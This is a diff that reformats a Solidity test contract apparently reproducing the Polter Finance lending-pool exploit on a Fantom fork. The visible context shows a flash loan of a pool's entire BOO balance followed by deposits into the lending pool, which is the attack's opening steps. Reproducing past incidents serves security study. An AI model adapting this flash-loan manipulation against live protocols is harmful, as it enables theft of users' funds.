@@ -62,8 +62,10 @@ contract Exploit_Polter_Finance is TestHarness, TokenBalanceTracker {
     ILendingPool private constant Lending = ILendingPool(0x867fAa51b3A437B4E2e699945590Ef4f2be2a6d5);
     IUniswapV2Router02 private constant Router =
         IUniswapV2Router02(0xF491e7B69E4244ad4002BC14e878a34207E38c29);
-    IUniswapV2Pair private constant pairWftmBooV2 = IUniswapV2Pair(0xEc7178F4C41f346b2721907F5cF7628E388A7a58);
-    IUniswapV3Pair private constant pairWftmBooV3 = IUniswapV3Pair(0xEd23Be0cc3912808eC9863141b96A9748bc4bd89);
+    IUniswapV2Pair private constant pairWftmBooV2 =
+        IUniswapV2Pair(0xEc7178F4C41f346b2721907F5cF7628E388A7a58);
+    IUniswapV3Pair private constant pairWftmBooV3 =
+        IUniswapV3Pair(0xEd23Be0cc3912808eC9863141b96A9748bc4bd89);
 
     function setUp() external {
         cheat.createSelectFork(vm.envString("RPC_URL"), 97_508_838);
@@ -90,7 +92,14 @@ contract Exploit_Polter_Finance is TestHarness, TokenBalanceTracker {
         pairWftmBooV3.flash(address(this), 0, BOO.balanceOf(address(pairWftmBooV3)), "");
     }
 
-    function uniswapV3FlashCallback(uint256, /* fee0 */ uint256 fee1, bytes calldata /* data */ ) external {
+    function uniswapV3FlashCallback(
+        uint256,
+        /* fee0 */
+        uint256 fee1,
+        bytes calldata /* data */
+    )
+        external
+    {
         logBalancesWithLabel("Attacker", address(this));
 
         uint256 repay = BOO.balanceOf(address(this)) + fee1;
@@ -115,7 +124,9 @@ contract Exploit_Polter_Finance is TestHarness, TokenBalanceTracker {
         uint256, /* amount0 */
         uint256 amount1,
         bytes calldata /* data */
-    ) external {
+    )
+        external
+    {
         BOO.approve(address(Lending), 1e18);
         Lending.deposit(address(BOO), 1e18, address(this), 0);
 
